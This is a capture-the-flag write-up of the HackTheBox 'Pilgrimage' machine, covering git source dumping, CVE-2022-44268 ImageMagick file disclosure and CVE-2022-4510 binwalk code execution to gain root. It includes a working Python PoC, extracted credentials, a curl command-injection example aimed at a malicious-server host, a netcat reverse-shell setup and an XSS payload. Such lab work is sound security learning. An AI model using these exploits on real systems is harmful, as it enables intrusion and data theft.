---
title: Pilgrimage (HTB) / Easy
description: Write-up of Pilgrimage Machine (HackTheBox) 
date: 2023-07-12 14:30:00 -3000
categories: [writeups]
tags: [hackthebox, htb, writeup, easy, git, imagemagick, binwalk, CVE-2022-4510, CVE-2022-44268]
author: tandera
show_image_post: true
---

<img src="/assets/writeups/2023-07-12-pilgrimage/Pilgrimage.png" width=500px>

## Machine Information

---
- Alias: Pilgrimage
- Date: 24 June 2023
- Platform: HackTheBox
- OS: Linux
- Difficulty: Easy
- Tags: #htb #linux #git #imagemagick #binwalk #cve
- Status: Active
- IP: 10.10.11.219

---

## Resolution Summary

1. While scanning for open ports, the attacker finds an HTTP web server and an SSH.
2. When fuzzing directories on the web server, he finds the `.git` directory.
3. The hacker dumps the source code of the app using [git-dumper](https://github.com/arthaud/git-dumper).
4. By inspecting the `magick` binary included in the source, the attacker discovers that the server is vulnerable to Local File Inclusion through its `convert` command.
5. He obtains the SQLite database file and discovers a valid SSH login in the Users table.
6. On the system, the hacker searches for active processes and discovers a `malwarescan.sh` running as root on the machine.
7. Reading it, he finds that the script uses the `binwalk -e` command to check for new files in the `shrunk` directory.
8. Investigating further, he discovers that the binwalk binary is vulnerable to Path Traversal, allowing Remote Code Execution by writing a malicious plugin in the `.config/plugins` path.
9. The attacker triggers the RCE by placing a handcrafted PNG file in the `shrunk` directory, activating binwalk and executing the malicious plugin.

## Tools

| Purpose                           | Tools                                       |
|:----------------------------------|:--------------------------------------------|
| Port Scanning                     | [`nmap`](https://nmap.org/)                                       |
| Directory Bruteforcing            | [`ffuf`](https://github.com/ffuf/ffuf)                                        |
| Git Dumping   | [`git-dumper`](https://github.com/arthaud/git-dumper) |
| Exploit Writing | [`python3`](https://www.python.org/)|



## Information Gathering

### Port Scanning

Searching for available services:

```
# nmap -sS -oN nmap.txt 10.10.11.219

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The server runs a up-to-date version of OpenSSH. Let's take a look at the HTTP.

> You can download the files of this writeup [here](/assets/writeups/2023-07-12-pilgrimage/pilgrimage.tar.gz)!
{: .prompt-tip }

## Enumeration

### HTTP (Nginx 1.18.0/pilgrimage.htb)

Accessing the main page:

<img src="/assets/writeups/2023-07-12-pilgrimage/homepage.png">

This looks... familiar. Everyone used some image converter/shrink at some time. In this website, we can send images and the server will shrink it. We can also create an account, login, and see the uploaded photos on the Dashboard:

<img src="/assets/writeups/2023-07-12-pilgrimage/dashboard.png">

Let's think in some possibilities of entrypoints on this application:

1. SQL Injection
	- The user input fields are properly sanitized? The server is using Prepared Statements to built the queries? If not, we can inject SQL code into the app.
2. File Upload Vulnerabilities
	- How the Server receives our images? Can we send a malicious file (for example, a PHP script) instead of images?
3. Code Injection through Filename
	- When sending a file through POST request, the filename is sent too. If the server uses command line tools to shrink the image (like ImageMagick, for example), we can try to inject code directly into the command line.

Before we test it out, let's enumerate some more!

#### Directory Bruteforcing

```shell
ffuf -w ~/Projects/SecLists/Discovery/Web-Content/common.txt -u "http://pilgrimage.htb/FUZZ"

.git/index              [Status: 200, Size: 3768, Words: 22, Lines: 16, Duration: 206ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 206ms]
.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 206ms]
.htpasswd               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 207ms]
.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 206ms]
.git/logs/              [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 207ms]
.hta                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 207ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 207ms]
assets                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 205ms]
index.php               [Status: 200, Size: 7621, Words: 2051, Lines: 199, Duration: 204ms]
tmp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 203ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 203ms]
:: Progress: [4715/4715] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

This is gold: some `.git` directories are available to us. With tools like [`git-dumper`](https://github.com/arthaud/git-dumper), we can get the source code of the application![^1]

```shell
git-dumper http://pilgrimage.htb/.git .
# ...
[-] Running git checkout .
```

Now we can see all the code locally: 

```
$ tree .
├── assets
│   ├── bulletproof.php
│   └── ...
│
├── dashboard.php
├── index.php
├── login.php
├── logout.php
├── magick
├── register.php
└── vendor
    └── ...
```

#### Source code analysis

##### SQL Injection

The very first thing i've checked was the database interaction of the server. When the user tries to login in the app, the `login.php` file is called. It interacts with a [sqlite](https://www.sqlite.org/index.html) database to see if the credentials are valid. The code uses the `prepare` function (for [Prepared Statements](https://en.wikipedia.org/wiki/Prepared_statement)), preventing SQLI:

```php
$db = new PDO('sqlite:/var/db/pilgrimage');
$stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
$stmt->execute(array($username,$password));
```

The same thing happens with the `register.php`:

```php
$db = new PDO('sqlite:/var/db/pilgrimage');
$stmt = $db->prepare("INSERT INTO `users` (username,password) VALUES (?,?)");
$status = $stmt->execute(array($username,$password));
```

Both of these snippets are secure, so... no SQL Injections here.

##### File Upload Vulnerabilities

Let's see how the server handles files:

```php
// index.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
```

Hmph. This app uses a external library called Bulletproof. Let's see the `assets/bulletproof.php` file:

```php
/**
 * BULLETPROOF.
 * 
 * A single-class PHP library to upload images securely.
 * 
 * PHP support 5.3+
 * 
 * @version     4.0.0
 * @author      https://twitter.com/_samayo
 * @link        https://github.com/samayo/bulletproof
 * @license     MIT
 */
```

Seems secure. We can also check the [GitHub repo](https://github.com/samayo/bulletproof) for more information, but the implementation isn't vulnerable to File Upload Attacks.

In the first place, Bulletproof verifies the mime type of the files received, preventing attackers to upload malicious files (such as PHP scripts):

```php
// bulletproof.php
public function upload() {
  // ...
  $isValid = $this->contraintsValidator();
  // ...
}

protected function contraintsValidator() {
  $this->getImageMime($this->_files['tmp_name']);
  if (!in_array($this->mime, $this->mimeTypes)) { 
    // $this->mimeTypes are user defined. In this server: jpeg and png
    return false;
}

```

The `getImageMime` function uses a built-in PHP function called [`exif_imagetype`](https://www.php.net/manual/en/function.exif-imagetype.php). It will only check the magic number of the given file. If the server used only this mechanism, [we're able to send malicious files](https://stackoverflow.com/a/40366915).

Bulletproof ensures [other security measures](https://github.com/samayo/bulletproof#what-makes-this-secure) than just the magic numbers check. So, if we're not trying to find a zero-day, let's move on. 

##### Code Injection through Filename

As mentioned before, the server could use a external software to shrink the image: and spot on! The `exec` function is called using the command convert from ImageMagick:

```php
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```

If the `getName()` returns the name of our image, we're able to inject code.

Checking this function on Bulletproof:

```php
public function getName() {
  if (!$this->name) {
	$this->name = uniqid('', true).'_'.str_shuffle(implode(range('e', 'q')));
  }

  return $this->name;
}
```

Could not be that good: if the app doesn't define a name for the image through `setName()` (which is the case), Bulletproof generates a random one. 

Worth mention that the app would be vulnerable to RCE if it used the `setName()` function. This happens because the name is not properly sanitized:

```php
public function setName($isNameProvided = null) {
  if ($isNameProvided) {
	$this->name = filter_var($isNameProvided, FILTER_SANITIZE_STRING);
  }

  return $this;
}
```

The [filter_var](https://www.php.net/manual/en/function.filter-var.php) only cleans the quotes and html tags[^2] . Other characters like `;`, `&` and `#` aren't sanitized at all, allowing us to manipulate the exec expression. For example, if we set the name of the image with:

```shell
 && curl http://malicious-server.com/file.php -o /var/www/pilgrimage.htb/secret.php #
```

The exec expression would be:

```shell
/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/ && curl http://malicious-server.com/file.php -o /var/www/pilgrimage.htb/secret.php # ...
```

This would be interesting, but the app doesn't use the `setName` and, therefore, the file name **does not have any influence** on the command executed.

##### A Unexpected Exit

And now? How can we manage to exploit this code?

This went unnoticed at first glance, but take a new look on the `exec`: 

```php
exec("/var/www/pilgrimage.htb/magick convert ... ");
```

From where it's called, for God's sake? Our directory! This binary is on the same folder as the web app and, therefore, accessible to us. 

Let's take a look at it:

```shell
$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
```

Searching up for this version, we've find about a File Disclosure vulnerability (CVE-2022-44268) when parsing `.png` files:

> "[...] ImageMagick will interpret the text string as a filename and will load the content as a raw profile, then the attacker can download the resized image which will come with the content of a remote file."[^3]

Sounds like Greek for you? No worries, let's understand the and exploit this vulnerability, step-by-step. If you just want a PoC, check [here](https://github.com/entr0pie/CVE-2022-44268) .[^4]

## Exploitation

### PNG, Imagemagick and Chunks

Firstly, Imagemagick tries to read and parse a PNG. This type of image can contain various chunks, which is a self-contained block of data that holds specific information within the file. It acts as a modular unit, containing different types of data such as image pixels, metadata, or textual information.

A text chunk, specifically, is a type of chunk that stores human-readable text data. In PNG, tEXt is used to embed textual information related to the image, such as descriptions, titles, author information, or copyright notices. It consists of a **keyword** that identifies the type of information and a corresponding text string that holds the actual textual content. Multiple tEXt chunks can be included in a PNG image.

Here's the deal: when handling the **profile** keyword, Imagemagick misunderstand it's value as a filename and import it to the resized file (as a raw profile) in hex. 

To exploit it, let's create a Python script to embed our chunk on the image:

```python
#!/bin/python3

from sys import argv
from png import Reader, write_chunks

if len(argv) < 2:
    print("Usage: CVE-2022-44268.py <LFI>")
    exit(1)

LFI = argv[1]

reader = Reader(filename='source.png')
chunks = list(reader.chunks())

chunk_field = (b"tEXt", f"Profile\x00{LFI}".encode())
chunks.insert(1, chunk_field)

file = open('output.png', 'wb')
write_chunks(file, chunks)
file.close()
```

Creating the `output.png`:

```shell
python3 CVE-2022-44268.py /etc/hosts
```

Send the file to the server and download the resized. Now, inspect it with `identify`:

```shell
identify -verbose 64a318dbc65d1.png
```

You should see a chunk called `Raw profile type`, containing a hex sequence:

```
    Raw profile type:

     205
3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c677269
6d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67
206c696e65732061726520646573697261626c6520666f7220495076362063617061626c
6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c68
6f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465
730a666630323a3a32206970362d616c6c726f75746572730a
```

Decoding to `utf-8`: 

```shell
python3 -c 'print(bytes.fromhex("3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c6772696d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f75746572730a").decode())'
```

And here's our file!

```
127.0.0.1	localhost
127.0.1.1	pilgrimage pilgrimage.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### And now?

We can see any file that Imagemagick has access. Here's where things heat's up: the database of this app is SQLite. The main attribute (and, for us, benefit) of SQLite is it **serverless** design, which means that all the database it's on a single file!

Checking the code of the app again:

```php
// Register.php
$db = new PDO('sqlite:/var/db/pilgrimage');
$stmt = $db->prepare("INSERT INTO `users` (username,password) VALUES (?,?)");
$status = $stmt->execute(array($username,$password));
```

The path to the database is `/var/db/pilgrimage`. Let's retrieve it!

```
python3 CVE-2022-44268.py /var/db/pilgrimage
```

Send the file to the server and check the hex content:

```
53514c69746520666f726d617420330010000101004020200000008d0000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
0000000000000000000000000000000000000000000 [...]
```

Now, save it into a file called `raw_db.txt`.

Let's recreate the database locally:

```python
>>> file = open('raw_db.txt').read().replace('\n', '')
>>> raw_content = bytes.fromhex(file)
>>> open('pilgrimage.db', 'wb').write(raw_content)
```

Now, we can inspect the database on our machine.

```
sqlite3 pilgrimage.db
sqlite> .tables
images users
```

Selecting all the users available:

```
sqlite> SELECT * FROM users;
emily|abigchonkyboi123
```

Trying this user and password on SSH, we get a valid login![^5]

## Privilege Escalation

### Local Enumeration (`emily`)

---
- id: `uid=1000(emily) gid=1000(emily) groups=1000(emily)`
- system: `Debian GNU/Linux 11`
- users: `emily`, `root`.
- kernel: `5.10.0-23-amd64 x86_64 GNU/Linux`
- sudo enabled: `not for emily.`

---

Searching for active processes, we've find a `malwarescan.sh` running (as root) in the machine: 

```
root         722  0.0  0.0   6816  2304 ?        S    09:22   0:00 /bin/bash /usr/sbin/malwarescan.sh
```

Let's inspect it:

```shell
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

Interesting: this script monitors a directory for the creation of new files ([inotifywait](https://linux.die.net/man/1/inotifywait)), analyzes the newly created binary files using [`binwalk`](https://github.com/ReFirmLabs/binwalk), and deletes them if they contain certain banned strings specified in the `blacklist` array.

Investigating binwalk:

```shell
$ binwalk

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
```

Searching it in the [Binwalk releases](https://github.com/ReFirmLabs/binwalk/releases), we find a correction to [directory traversal](https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/) vulnerability on the most recent version:

<img src="/assets/writeups/2023-07-12-pilgrimage/binwalk.png">

The binwalk installed on the Server is vulnerable!

### What's this vulnerability about? ([CVE-2022-4510](https://nvd.nist.gov/vuln/detail/CVE-2022-4510))

It's a path traversal that allows us to write files anywhere, by crafting a malicious PFS file and using binwalk's extraction mode (`binwalk -e`). 

By placing a specially crafted binwalk module in the .config/binwalk/plugins folder during extraction, we can achieve remote code execution. 

Fortunately, [CryptoCat](https://www.youtube.com/watch?v=71e5iMoDDMA) made a amazing video about this (make sure to see it later)!

### Exploitation

First of all, PFS is a kinda obscure file format. His creator, Peter
"Lekensteyn", built it to use handle files on a Siemens Router[^6]. We can set up our own malicious file with it's own tool, the [`pfstool`](https://lekensteyn.nl/files/pfs/). This approach can give us a good deep dive on how this vulnerability occurs, but at a cost: a lot of time and effort. For now, let's use something already done. 

[Etienne Lacoche](https://www.linkedin.com/in/etiennelacoche/?originalSubdomain=fr) made a [exploit](https://www.exploit-db.com/exploits/51249) which embeds the PFS file content into a image, containing the handmade plugin that will connect the server into our machine. When we send the malicious photo (directly on the shrunk directory), the server will execute the `malwarescan.sh`, using the vulnerable binwalk binary and giving us root access.

Let's download the PoC to our machine: 

```shell
curl https://www.exploit-db.com/raw/51249 > exploit.py
```

You can choose any image at your taste. I'm gonna use the [Dark Side Of The Moon](https://www.youtube.com/watch?v=k9ynZnEBtvw) cover (my little tribute to one of the best albums I've ever heard).

<iframe style="border-radius:12px" src="https://open.spotify.com/embed/album/4LH4d3cOWNNsVw41Gqt2kv?utm_source=generator" width="100%" height="352" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>

```shell
curl https://upload.wikimedia.org/wikipedia/pt/3/3b/Dark_Side_of_the_Moon.png > image.png
```

We can transfer both files to the server in many ways. I'm gonna host a simple web server and get the files through curl, but you can also use the `scp` command. 

```shell
php -S 0.0.0.0:8000
```

On the **server**, let's create a folder a retrieve all these files to it.

```shell
mkdir /tmp/.secret && cd /tmp/.secret
curl http://10.10.14.207:8000/exploit.py > exploit.py
curl http://10.10.14.207:8000/image.png > image.png
```

You can close the PHP server with `Control + C`.

Let's bake the malicious image:

```shell
python3 exploit.py image.png 10.10.14.207 8000
```

Wait for a connection (on your machine):

```shell
nc -lvp 8000
```

Finally, move the infected file to the `shrunk` folder:

```shell
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```

And now we're root!

```shell
whoami
# root
```

## Another Vulnerabilities

#### XSS

When uploading a file, you can set the filename to a `<img>` tag with a `onerror` attribute., like this: 

```html
<img src=imaginarysource onerror=\"alert('XSS');\">
```

The server doesn't sanitize it and stores this filename attribute in the database. When the user access the [dashboard](http://pilgrimage.htb/dashboard.php), the name is interpreted as real HTML, resulting in a stored XSS.

Requesting the server:

<img src="/assets/writeups/2023-07-12-pilgrimage/xss_request.png">

Accessing the dashboard:

<img src="/assets/writeups/2023-07-12-pilgrimage/xss.png">

#### Broken Access Control

In a real scenario, a user should only access it's own images. This app doesn't verify who is accessing the image, even if you created it with your account. 

```shell
curl -v http://pilgrimage.htb/shrunk/64983c25a25b8.jpeg -o image.jpeg
```

##### Why it's important?

Yeah, it's not **that** concerning, but a similar case happens with [LightShot](https://prnt.sc/), a print screen app for Windows and MacOS. You can take a screenshot and add it to the cloud, generating a link. The issue (or feature, to attackers and security minimalists) is that everyone can access that screenshot you've taken[^7]

Thanks for reading and happy hacking!

[^1]: Git is a software for developers to create code, registering and tracking all the changes. When used, Git creates a `.git` directory to store data about the changes. If the contents of `.git` are public, we can get the source code of the app.
[^2]: See the `FILTER_SANITIZE_STRING` section on the [PHP documentation](https://www.php.net/manual/en/filter.filters.sanitize.php). 
[^3]: Read more on the [MetabaseQ article](https://www.metabaseq.com/imagemagick-zero-days/).
[^4]: Before written my own Python script, I've used a Rust version of it. Make sure to [check it out](https://github.com/voidz0r/CVE-2022-44268). 
[^5]: To confirm if the emily was a user on the machine, we can check the `/etc/passwd` file.
[^6]: More info [here](https://lekensteyn.nl/files/pfs/pfs.txt).
[^7]: https://www.reddit.com/r/privacy/comments/9yzya4/lightshot_millions_of_screenshots_available_to/
